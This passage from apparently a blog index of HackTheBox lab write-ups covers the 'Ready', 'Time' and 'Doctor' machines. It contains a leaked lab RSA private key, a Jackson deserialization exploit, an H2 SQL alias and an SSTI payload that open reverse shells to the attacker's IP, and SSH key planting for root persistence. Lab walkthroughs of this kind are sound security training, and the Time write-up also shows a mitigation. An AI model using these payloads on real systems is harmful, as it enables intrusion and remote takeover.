3hO044mOPeiqsHM/+RQOW240EszoYKXKqOxzq/SK4bpRtjHsidSJo4ECgYEA1jzy n20X43ybDMrxFdVDbaA8eo+og6zUqx8IlL7czpMBfzg5NLlYcjRa6Li6Sy8KNbE8 kRznKWApgLnzTkvupk/oYSijSliLHifiVkrtEY0nAtlbGlgmbwnW15lwV+d3Ixi1 KNwMyG+HHZqChNkFtXiyoFaDdNeuoTeAyyfwzu8CgYAo4L40ORjh7Sx38A4/eeff Kv7dKItvoUqETkHRA6105ghAtxqD82GIIYRy1YDft0kn3OQCh+rLIcmNOna4vq6B MPQ/bKBHfcCaIiNBJP5uAhjZHpZKRWH0O/KTBXq++XQSP42jNUOceQw4kRLEuOab dDT/ALQZ0Q3uXODHiZFYAQKBgBBPEXU7e88QhEkkBdhQpNJqmVAHMZ/cf1ALi76v DOYY4MtLf2dZGLeQ7r66mUvx58gQlvjBB4Pp0x7+iNwUAbXdbWZADrYxKV4BUUSa bZOheC/KVhoaTcq0KAu/nYLDlxkv31Kd9ccoXlPNmFP+pWWcK5TzIQy7Aos5S2+r ubQ3AoGBAIvvz5yYJBFJshQbVNY4vp55uzRbKZmlJDvy79MaRHdz+eHry97WhPOv aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd -----END RSA PRIVATE KEY----- SSH Access - root (host) After changing the key permissions to 600, I can login as root user.\n→ root@kali «ssh-key» «10.10.14.20» $ chmod 600 root_rsa → root@kali «ssh-key» «10.10.14.20» $ ssh -i root_rsa root@10.10.10.220 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64) ...\u0026lt;SNIP\u0026gt;.. System load: 0.05 Usage of /: 67.1% of 17.59GB Memory usage: 84% Swap usage: 4% Processes: 434 Users logged in: 0 IPv4 address for br-bcb73b090b3f: 172.19.0.1 IPv4 address for docker0: 172.17.0.1 IPv4 address for ens160: 10.10.10.220 IPv6 address for ens160: dead:beef::250:56ff:feb9:211 ...\u0026lt;SNIP\u0026gt;.. Last login: Thu Feb 11 14:28:18 2021 root@ready:~# id uid=0(root) gid=0(root) groups=0(root) root@ready:~# ls -l total 16 drwxr-xr-x 3 root root 4096 Dec 1 12:41 docker-gitlab drwxr-xr-x 10 root root 4096 Jul 9 2020 ready-channel -r-------- 1 root root 33 Jul 8 2020 root.txt drwxr-xr-x 3 root root 4096 May 18 2020 snap I can also grab the root flag.\nroot@ready:~# cut -c-15 root.txt b7f98681505cd39  References  https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/ https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-ready/","summary":"Ready is a medium difficulty Linux machine from HackTheBox that features a GitLab instance in a Docker container. By chaining two CVEs, I\u0026rsquo;m able to gain a foothold on the container. Enumerating inside the container discovers a password that can be used on container root account. The container is found to be running in privileged mode, and this can be abused to mount the host file system into the container.","tags":["Linux","GitLab","CVE-2018-19571","CVE-2018-19585","SSRF","CRLF-injection","Container","Docker","Docker-breakout"],"title":"HackTheBox - Ready"},{"content":"Time is a medium difficulty Linux machine from HackTheBox that features a web application which provides JSON beautifier and validator services. Testing some invalid inputs exposes the application error message, indicating it backed with Jackson library. Searching for the error message on Google leads to a research blog about deserialization on Jackson. After reproducing the steps from the blog, I\u0026rsquo;m able to gain a foothold on the box. Enumerating the files discovers a timer script that is executed by the root user every 10 seconds. The script is world-writable, allowing me to inject a malicious code and obtain a root shell.\nSkills Learned  Deserialization Attack Mitigation CVE-2019-12384 Exploiting Systemd timers  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux  Reconnaissance Nmap nmap discovers two open ports: SSH on port 22, and a HTTP web server on port 80.\n→ root@kali «time» «10.10.14.19» $ mkdir nmap; nmap -sC -sV -oA nmap/10-initial-time 10.10.10.214 Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-08 07:29 EDT Nmap scan report for 10.10.10.214 Host is up (0.069s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Online JSON parser Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 27.18 seconds Enumeration TCP 80 - Website Visiting port 80 shows a website called \u0026ldquo;Online JSON Beautifier \u0026amp; Validator\u0026rdquo;.\n Clicking on the drop down menu, it provides two options: \u0026ldquo;Beautify\u0026rdquo; and \u0026ldquo;Validate (beta!)\u0026rdquo;.\n Testing Inputs I submitted {\u0026quot;test\u0026quot;: \u0026quot;iamf\u0026quot;} to the input box and clicked the \u0026ldquo;Process\u0026rdquo; button. As expected, the beautify option just a JSON beautifier like jq.\n I submitted the same input on \u0026ldquo;Validate (beta!)\u0026rdquo;, but this time it returns the following error.\nValidation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object  I found this site while searching for the error message on Google. It turned out it wanted an array input, so I copied the sample input from that site and pasted it to the validator.\n[ \u0026#34;org.baeldung.jackson.inheritance.Truck\u0026#34;, { \u0026#34;make\u0026#34;: \u0026#34;Isuzu\u0026#34;, \u0026#34;model\u0026#34;: \u0026#34;NQR\u0026#34;,\u0026#34;payloadCapacity\u0026#34;: 7500.0 } ] And now it returns a different error message.\n And that\u0026rsquo;s because it probably can\u0026rsquo;t find org.baeldung.jackson.inheritance.Truck since I made it up.\nFinding Vulnerability I might be able to inject the \u0026ldquo;org.baeldung.jackson.inheritance.Truck\u0026rdquo; with a java gadget class for deserialization attack, and after searching around about deserialization topics on Jackson, I found this two blog posts about Jackson RCE:\n Exploiting the Jackson RCE: CVE-2017-7525 - Adam Caudill Jackson gadgets - Anatomy of a vulnerability · Doyensec\u0026rsquo;s Blog  However, the post on Doyensec\u0026rsquo;s blog is newer (2019 vs 2017), so I dig into that blog. The researcher on that blog uses ch.qos.logback.core.db.DriverManagerConnectionSource as his gadget class, leveraging the alias feature from the H2 database to execute arbitrary code. This research is classified as CVE-2019-12384.\nBelow is the example payload used.\n[\u0026#34;ch.qos.logback.core.db.DriverManagerConnectionSource\u0026#34;, {\u0026#34;url\u0026#34;:\u0026#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://localhost:8000/inject.sql\u0026#39;\u0026#34;}] Foothold Shell as pericles Exploiting Jackson CVE-2019-12384 I\u0026rsquo;ll use the research from Doyensec\u0026rsquo;s blog above as my reference.\nFirst, I\u0026rsquo;ll create a copy of the inject.sql file that is used by the researcher.\ninject.sql:\nCREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { String[] command = {\u0026#34;bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd}; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; } $$; CALL SHELLEXEC(\u0026#39;id \u0026gt; /dev/tcp/10.10.14.19/9000\u0026#39;) Then, I\u0026rsquo;ll setup a Python web server to host the SQL file and an nc listener to catch the request.\n→ root@kali «time» «10.10.14.19» $ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Now I\u0026rsquo;ll use the following JSON payload and submit it to the validator.\n[\u0026#34;ch.qos.logback.core.db.DriverManagerConnectionSource\u0026#34;, {\u0026#34;url\u0026#34;:\u0026#34;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://10.10.14.19/inject.sql\u0026#39;\u0026#34;}] Within a few seconds, my Python web server receives a request for inject.sql, and my listener captures the output of the id command.\n Knowing this, I can weaponize the inject.sql file to send myself a shell, and then perform the same procedure as above.\nWeaponization - Reverse Shell Now with the following inject.sql,\nCREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { String[] command = {\u0026#34;bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd}; java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; } $$; CALL SHELLEXEC(\u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.19/9000 0\u0026gt;\u0026amp;1\u0026#39;) I can obtain an interactive shell.\n→ root@kali «time» «10.10.14.19» $ nc -nvlp 9000 listening on [any] 9000 ... connect to [10.10.14.19] from (UNKNOWN) [10.10.10.214] 42496 bash: cannot set terminal process group (944): Inappropriate ioctl for device bash: no job control in this shell pericles@time:/var/www/html$  Upgrade to SSH With current access, I can put my public key to the authorized_keys file.\npericles@time:/home/pericles$ mkdir .ssh pericles@time:/home/pericles$ pericles@time:/home/pericles$ echo \u0026#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK\u0026#39; \u0026gt; .ssh/authorized_keys Now I can login as pericles with my SSH private key.\n→ root@kali «time» «10.10.14.19» $ ssh pericles@10.10.10.214 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64) ...\u0026lt;SNIP\u0026gt;... System load: 0.0 Usage of /: 21.2% of 27.43GB Memory usage: 16% Swap usage: 0% Processes: 235 Users logged in: 0 IPv4 address for ens160: 10.10.10.214 IPv6 address for ens160: dead:beef::250:56ff:feb9:a553 ...\u0026lt;SNIP\u0026gt;... Last login: Fri Oct 23 09:19:19 2020 from 10.10.14.5 pericles@time:~$ id uid=1000(pericles) gid=1000(pericles) groups=1000(pericles) Privilege Escalation Shell as root Internal Enumeration pericles is the only user on this box.\npericles@time:/home/pericles$ cat /etc/passwd | grep sh$ cat /etc/passwd | grep sh$ root:x:0:0:root:/root:/bin/bash pericles:x:1000:1000:Pericles:/home/pericles:/bin/bash While searching a files owned by pericles, I spotted a script called timer_backup.sh.\npericles@time:~$ find / -type f -user pericles 2\u0026gt;/dev/null |grep -v \u0026#39;proc\\|sys\u0026#39; /usr/bin/timer_backup.sh /dev/shm/payloadds9LXy /home/pericles/.gnupg/trustdb.gpg /home/pericles/.gnupg/pubring.kbx /home/pericles/.bashrc ...\u0026lt;SNIP\u0026gt;... The script is backing up the website contents in /var/www/html to the root home directory.\npericles@time:~$ cat /usr/bin/timer_backup.sh #!/bin/bash zip -r website.bak.zip /var/www/html \u0026amp;\u0026amp; mv website.bak.zip /root/backup.zip Interestingly, that script is writable by others.\npericles@time:~$ ls -l /usr/bin/timer_backup.sh -rwxrw-rw- 1 pericles pericles 88 Apr 10 21:05 /usr/bin/timer_backup.sh I searched other file related to the script, and found out there is a timer owned by root.\npericles@time:~$ find / -type f -name \u0026#34;timer_backup*\u0026#34; -ls 2\u0026gt;/dev/null 795750 4 -rw-r--r-- 1 root root 214 Oct 23 06:46 /etc/systemd/system/timer_backup.timer 787186 4 -rw-r--r-- 1 root root 159 Oct 23 05:59 /etc/systemd/system/timer_backup.service 1317302 4 -rwxrw-rw- 1 pericles pericles 88 Apr 10 21:10 /usr/bin/timer_backup.sh timer_backup.timer requires timer_backup.service,\npericles@time:~$ cat /etc/systemd/system/timer_backup.timer [Unit] Description=Backup of the website Requires=timer_backup.service [Timer] Unit=timer_backup.service #OnBootSec=10s #OnUnitActiveSec=10s OnUnitInactiveSec=10s AccuracySec=1ms [Install] WantedBy=timers.target and what timer_backup.service doing is it restarts web_backup.service.\npericles@time:~$ cat /etc/systemd/system/timer_backup.service [Unit] Description=Calls website backup Wants=timer_backup.timer WantedBy=multi-user.target [Service] ExecStart=/usr/bin/systemctl restart web_backup.service web_backup.service executes the timer_backup.sh script which is owned by pericles.\npericles@time:~$ cat /etc/systemd/system/web_backup.service [Unit] Description=Creates backups of the website [Service] ExecStart=/bin/bash /usr/bin/timer_backup.sh Exploiting timer_backup.sh With writable access, I can put a bash reverse shell in timer_backup.sh, and then setup a nc listener.\npericles@time:~$ echo \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.19/9002 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt;\u0026gt; /usr/bin/timer_backup.sh pericles@time:~$ pericles@time:~$ cat /usr/bin/timer_backup.sh #!/bin/bash zip -r website.bak.zip /var/www/html \u0026amp;\u0026amp; mv website.bak.zip /root/backup.zip bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.72/9002 0\u0026gt;\u0026amp;1 Within a few seconds, I have a root shell on my listener, but the problem is that shell is somehow exited by itself.\n→ root@kali «time» «10.10.14.19» $ rlwrap nc -nvlp 9002 listening on [any] 9002 ... connect to [10.10.14.72] from (UNKNOWN) [10.10.10.214] 57648 bash: cannot set terminal process group (411032): Inappropriate ioctl for device bash: no job control in this shell root@time:/# root@time:/# exit So I repeated the steps, but this time, I immediately injected my public key to the root\u0026rsquo;s authorized_keys file.\n→ root@kali «time» «10.10.14.19» $ nc -nvlp 9002 listening on [any] 9002 ... connect to [10.10.14.19] from (UNKNOWN) [10.10.10.214] 34182 bash: cannot set terminal process group (65312): Inappropriate ioctl for device bash: no job control in this shell root@time:/# echo \u0026#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK\u0026#39; \u0026gt; /root/.ssh/authorized_keys \u0026lt;rj6mXxSIGq3E5ks1g+moK\u0026#39; \u0026gt; /root/.ssh/authorized_keys root@time:/# exit After that, I can login as root via SSH.\n→ root@kali «time» «10.10.14.19» $ ssh root@10.10.10.214 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-52-generic x86_64) ...\u0026lt;SNIP\u0026gt;... System load: 0.0 Usage of /: 21.2% of 27.43GB Memory usage: 16% Swap usage: 0% Processes: 235 Users logged in: 0 IPv4 address for ens160: 10.10.10.214 IPv6 address for ens160: dead:beef::250:56ff:feb9:a553 ...\u0026lt;SNIP\u0026gt;... Last login: Tue Feb 9 14:41:33 2021 root@time:~# id uid=0(root) gid=0(root) groups=0(root) root@time:~# cut -c-16 root.txt 27375f967f43232f Extras In this extras, I\u0026rsquo;ll take a look into the vulnerable code that allows me to gain a remote code execution, and then I\u0026rsquo;ll try to patch it.\nCVE-2019-12384 Causes According to this site, in order to successfully exploit a Jackson deserialization vulnerability several conditions must be met.\n The first condition is fulfilled by the index.php file (/var/www/html/index.php). I have control on the user input.\n\u0026lt;?php if(isset($_POST[\u0026#39;data\u0026#39;])){ if(isset($_POST[\u0026#39;mode\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;mode\u0026#39;] === \u0026#34;2\u0026#34;){ $filename = tempnam(\u0026#34;/dev/shm\u0026#34;, \u0026#34;payload\u0026#34;); $myfile = fopen($filename, \u0026#34;w\u0026#34;) or die(\u0026#34;Unable to open file!\u0026#34;); $txt = $_POST[\u0026#39;data\u0026#39;]; // Condition #1, $txt controlled by user. no filter  fwrite($myfile, $txt); fclose($myfile); exec(\u0026#34;/usr/bin/jruby /opt/json_project/parse.rb $filename2\u0026gt;\u0026amp;1\u0026#34;, $cmdout, $ret); unlink($filename); if($ret === 0){ $output = \u0026#39;\u0026lt;pre\u0026gt;Validation successful!\u0026lt;/pre\u0026gt;\u0026#39;; } else{ $output = \u0026#39;\u0026lt;pre\u0026gt;Validation failed: \u0026#39; . $cmdout[1] . \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; } } else{ $json_ugly = $_POST[\u0026#39;data\u0026#39;]; $json_pretty = json_encode(json_decode($json_ugly), JSON_PRETTY_PRINT); $output = \u0026#39;\u0026lt;pre\u0026gt;\u0026#39;.$json_pretty.\u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; } } ?\u0026gt;...\u0026lt;SNIP\u0026gt;... The second condition fulfilled by the parser itself (/opt/json_project/parse.rb). It uses \u0026ldquo;Default typing\u0026rdquo;.\nrequire \u0026#39;java\u0026#39; Dir[\u0026#34;/opt/json_project/classpath/*.jar\u0026#34;].each do |f| require f end java_import \u0026#39;com.fasterxml.jackson.databind.ObjectMapper\u0026#39; java_import \u0026#39;com.fasterxml.jackson.databind.SerializationFeature\u0026#39; f = File.read(ARGV[0]) content = f puts content mapper = ObjectMapper.new mapper.enableDefaultTyping() # Condition #2, the uses of \u0026#34;default typing\u0026#34;. mapper.configure(SerializationFeature::FAIL_ON_EMPTY_BEANS, false); obj = mapper.readValue(content, java.lang.Object.java_class) # invokes all the setters puts \u0026#34;stringified: \u0026#34; + mapper.writeValueAsString(obj) The third condition is fulfilled by logback-core-1.3.0-alpha5.jar as the gadget class and h2–1.4.199.jar for the RCE capability. According to this blog, the H2 database alias feature can be abused. The researcher of CVE-2019–12384 abuses the alias feature to embed Java code.\nroot@time:/opt/json_project# grep -Ri version Binary file classpath/h2-1.4.199.jar matches Binary file classpath/jackson-databind-2.9.8.jar matches Binary file classpath/logback-core-1.3.0-alpha5.jar matches Binary file classpath/jackson-core-2.9.8.jar matches Mitigation After I make sure there is no one currently exploiting the box, I tried to update the Jackson library to the v2.11 and also applied the new feature to mitigate the deserialization attack on the source code. Here is the updated version of parse.rb:\nrequire \u0026#39;java\u0026#39; Dir[\u0026#34;/opt/json_project/classpath/*.jar\u0026#34;].each do |f| require f end java_import \u0026#39;com.fasterxml.jackson.databind.ObjectMapper\u0026#39; java_import \u0026#39;com.fasterxml.jackson.databind.SerializationFeature\u0026#39; java_import \u0026#39;com.fasterxml.jackson.databind.MapperFeature\u0026#39; # ==\u0026gt; Mitigation v2.11  f = File.read(ARGV[0]) content = f puts content mapper = ObjectMapper.new mapper.activateDefaultTyping() # ==\u0026gt; Mitigation v2.10, enableDefaultTyping() to activateDefaultTyping()  mapper.configure(MapperFeature::BLOCK_UNSAFE_POLYMORPHIC_BASE_TYPES); # ==\u0026gt; Mitigation v2.11  mapper.configure(SerializationFeature::FAIL_ON_EMPTY_BEANS, false); obj = mapper.readValue(content, java.lang.Object.java_class) # invokes all the setters puts \u0026#34;stringified: \u0026#34; + mapper.writeValueAsString(obj) I also write a dirty script to patch it as well as to revert the patch, so I can perform a quick test. The script is supposed to be executed from Time where the updated parser and the newer version of Jackson are hosted from my machine.\n#!/bin/bash # ./time.sh patch [ip] project_path=\u0026#34;/opt/json_project/\u0026#34; new_jackson=\u0026#34;jackson-core-2.11.0.jar\u0026#34; old_jackson=\u0026#34;jackson-core-2.9.8.jar\u0026#34; if [ \u0026#34;$1\u0026#34; == \u0026#34;patch\u0026#34; ]; then # backup the original code mkdir -p /dev/shm/orig/ mv $project_path\u0026#34;classpath/\u0026#34;$old_jackson /dev/shm/orig/ mv $project_path\u0026#34;parse.rb\u0026#34; /dev/shm/orig/ # These file hosted from my machine curl -s \u0026#34;http://$2/$new_jackson\u0026#34; \u0026gt; /tmp/$new_jackson curl -s \u0026#34;http://$2/parse.rb\u0026#34; \u0026gt; /tmp/parse.rb # move the updated parser and jackson cp /tmp/$new_jackson $project_path\u0026#34;classpath/\u0026#34;$new_jackson cp /tmp/parse.rb \u0026#34;$project_path\u0026#34; chmod +x $project_path\u0026#34;parse.rb\u0026#34; elif [ \u0026#34;$1\u0026#34; == \u0026#34;restore\u0026#34; ]; then rm $project_path\u0026#34;classpath/\u0026#34;$new_jackson rm $project_path\u0026#34;parse.rb\u0026#34; mv \u0026#34;/dev/shm/orig/$old_jackson\u0026#34; $project_path\u0026#34;classpath/\u0026#34; mv \u0026#34;/dev/shm/orig/parse.rb\u0026#34; $project_path rm /tmp/$new_jackson rm /tmp/parse.rb rm -r /dev/shm/orig/ fi I tried to exploit the validator again by reproducing the same steps as in the Foothold section, but this time my reverse shell didn’t connect back. I checked the validator on the browser, and now it returned this message.\nValidation failed: WARNING: An illegal reflective access operation has occurred  Well, it is working, isn’t it?\n References Exploitation:\n https://blog.doyensec.com/2019/07/22/jackson-gadgets.html https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html  Mitigation:\n https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062 https://snyk.io/vuln/SNYK-JAVA-COMFASTERXMLJACKSONCORE-450917  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-time/","summary":"Time is a medium difficulty Linux machine from HackTheBox that features a web application which provides JSON beautifier and validator services. Testing some invalid inputs exposes the application error message, indicating it backed with Jackson library. Searching for the error message on Google leads to a research blog about deserialization on Jackson. After reproducing the steps from the blog, I\u0026rsquo;m able to gain a foothold on the box. Enumerating the files discovers a timer script that is executed by the root user every 10 seconds.","tags":["OSCP-like","Linux","Jackson","Java","SSRF","Deserialization","CVE-2019-12384","Systemd-timer","Code-review","Mitigation"],"title":"HackTheBox - Time"},{"content":"Doctor is an easy difficulty Windows machine from HackTheBox that features a Flask web application which is vulnerable to blind Server-Side Template Injection. I\u0026rsquo;m able to gain a foothold using the SSTI vulnerability. Enumerating on the Apache log files discovers a user\u0026rsquo;s password. The user credentials are work on the Splunk Universal Forwarder service, which can be exploited to gain root access using PySplunkWhisperer2.\nSkills Learned  Server Side Template Injection Splunk UF Exploitation  Tools   Kali Linux (Attacking Machine) - https://www.kali.org/\n  Nmap - Preinstalled in Kali Linux\n  Gobuster - https://github.com/OJ/gobuste\n  Tplmap - https://github.com/epinna/tplmap\n  SSTI Cheatsheet - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#\n  PySplunkWhisperer2 - https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py\n  Reconnaissance Nmap An initial scans discovers three open ports: SSH on port 22, HTTP server on port 80, and a Splunk daemon on port 8089 backed with HTTPS.\n→ root@kali «exploits» «10.10.14.3» $ mkdir nmap; nmap -sC -sV -oN nmap/initial-doctor \u0026#39;10.10.10.209\u0026#39; Nmap scan report for 10.10.10.209 Host is up (0.055s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-methods: |_ Supported Methods: POST OPTIONS HEAD GET |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Doctor 8089/tcp open ssl/http Splunkd httpd | http-methods: |_ Supported Methods: GET HEAD OPTIONS | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Splunkd |_http-title: splunkd | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser | Issuer: commonName=SplunkCommonCA/organizationName=Splunk/stateOrProvinceName=CA/countryName=US | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020-09-06T15:57:27 | Not valid after: 2023-09-06T15:57:27 | MD5: db23 4e5c 546d 8895 0f5f 8f42 5e90 6787 |_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Enumeration TCP 80 - Website This page shows a kind of health service website called \u0026ldquo;Doctor\u0026rdquo; in the title.\n Gobuster URL brute force with gobuster didn\u0026rsquo;t find any interesting results.\n/images (Status: 301) [Size: 313] [--\u0026gt; http://10.10.10.209/images/] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.10.209/js/] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.10.209/css/] /contact.html (Status: 200) [Size: 19848] /blog.html (Status: 200) [Size: 19848] /about.html (Status: 200) [Size: 19848] /index.html (Status: 200) [Size: 19848] /services.html (Status: 200) [Size: 19848] /fonts (Status: 301) [Size: 312] [--\u0026gt; http://10.10.10.209/fonts/] /departments.html (Status: 200) [Size: 19848] /server-status (Status: 403) [Size: 277] /index.html (Status: 200) [Size: 19848] TCP 80 - doctors.htb Because adding a machine name with \u0026ldquo;.htb\u0026rdquo; as TLD to /etc/hosts file has become my habit (i.e doctor.htb), so at first, on the homepage, I didn\u0026rsquo;t notice that there is an additional \u0026ldquo;s\u0026rdquo; on info@doctors.htb.\n Once I added doctors.htb to my /etc/hosts file, I refreshed the page with that hostname, and it presented a different web application.\n In the page source, I found a comment telling that the archive feature is still in beta testing.\n I\u0026rsquo;ll note that /archive.\nGobuster I ran another gobuster scan, but it seems I\u0026rsquo;ll just register an account this time.\n/logout (Status: 302) [Size: 217] [--\u0026gt; http://doctors.htb/home] /register (Status: 200) [Size: 4493] /login (Status: 200) [Size: 4204] /home (Status: 302) [Size: 245] [--\u0026gt; http://doctors.htb/login?next=%2Fhome] /archive (Status: 200) [Size: 101] /account (Status: 302) [Size: 251] [--\u0026gt; http://doctors.htb/login?next=%2Faccount] /server-status (Status: 403) [Size: 276] My account is only available for 20 minutes.\n The \u0026ldquo;1\u0026rdquo; icon was actually a page number with URL of http://doctors.htb/home?page=1.\nTCP 8089 — Splunk Universal Forwarder I can visit the Splunk UF on port 8089 through the browser after adding HTTPS to the URL and accepting the SSL certificate warning.\nAt the top, I can see the Splunk version.\n Finding vulnerability Knowing the version, I did a quick search on Google to look for available exploits, and I came across hackbooktriks.xyz\n https://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence  The original research was published in here:\n https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/  But it requires credentials. I\u0026rsquo;ll just add this to my to do list.\nFoothold Shell as web SQL Injection - Failed I can create a post message on doctors.htb by visiting http://doctors.htb/post/new. Below is the example request\nPOST /post/new HTTP/1.1 Host: doctors.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://doctors.htb/post/new Content-Type: application/x-www-form-urlencoded Content-Length: 35 Connection: close Cookie: session=.eJwlzj0OwjAMQOG7eGZI7MSJe5kq_hOsLZ0Qd6cS69Mbvg_secT5hO19XPGA_eWwQRMSDJdkRrMYOFNNMZvRdM5gth6jkLulV3JtOS1EFOsQGlNMDDXW_VN37GFzmbaGrWhiFq-r91aVlGWsdMV1ByYeZfJShBtynXH8NQjfH00QMJk.YBo8Bw.h165pwEGvKjGaPS-d3RiIO-xe34 Upgrade-Insecure-Requests: 1 title=test\u0026amp;content=test\u0026amp;submit=Post I fed the request to SQLMap, but it doesn\u0026rsquo;t seem injectable.\nAnd then I looked into Wapplyzerーa web plugin that can be used to identify the technology stacks behind a websiteー, and it shows doctors.htb uses Flask as its backend.\n Server Side Template Injection (SSTI) Web applications that use Python Flask are typically run with a templating engine such as Jinja. On every templating engine, SSTI can occur when an un-sanitized user input is passed directly into the application templating process.\n PwnFunction’s video on SSTI was very informative.\nTryHackMe also has a room called “Flask” that contains an example of SSTI attack on Flask. I have completed that room, and the note is available on my GitHub.\n Here is the methodology to detect SSTI (taken from here):\n http://doctors.htb/home?page=1 is the first attack surface to target. I used a tool called Tplmap.py to automatically detect SSTI, but no luck.\n→ root@kali «exploits» «10.10.14.3» $ python tplmap.py -u \u0026#39;http://doctors.htb/home?page=iamf\u0026#39; [+] Tplmap 0.5 Automatic Server-Side Template Injection Detection and Exploitation Tool [+] Testing if GET parameter \u0026#39;page\u0026#39; is injectable [+] Smarty plugin is testing rendering with tag \u0026#39;*\u0026#39; [+] Smarty plugin is testing blind injection ...\u0026lt;SNIP\u0026gt;... [+] Ruby plugin is testing blind injection [+] Ejs plugin is testing rendering with tag \u0026#39;*\u0026#39; [+] Ejs plugin is testing blind injection [!][checks] Tested parameters appear to be not injectable. The second attack surface is http://doctors.htb/post/new, which allows me to create a post message. It consists of two input vectors: the title and the content/message.\n I copied the basic SSTI payloads for Jinja2 from PayloadAllTheThings to the post content, but it doesn\u0026rsquo;t return the expected result.\n It returns nothing as well when I submit the payloads on the title.\nAfter hours trying to figure out why it doesn\u0026rsquo;t work, I noticed that the /archive page occasionally returns an error after I put some payload that has the percentage symbol {% payload %} on the content/message section.\n Or sometimes it only has the post title that can be seen only from page source.\n So from there, I submitted the basic payload on the title.\nRight after inserting the payload, I checked the page source of /archive, and I found the SSTI expected result there.\n Reverse Shell The cheat-sheet from PayloadAllTheThings also contains a pre-crafted payload to get a reverse shell. All I have to do now is replace the IP address with mine and have my nc listener listening on the port I specified.\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \u0026#34;warning\u0026#34; in x.__name__ %}{{x()._module.__builtins__[\u0026#39;__import__\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#34;python3 -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;10.10.14.4\\\u0026#34;,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026#34;/bin/sh\\\u0026#34;,\\\u0026#34;-i\\\u0026#34;]);\u0026#39;\u0026#34;)}}{%endif%}{% endfor %} I have an interactive shell now.\n→ root@kali «doctor» «10.10.14.3» $ nc -nvlp 9000 listening on [any] 9000 ... connect to [10.10.14.34] from 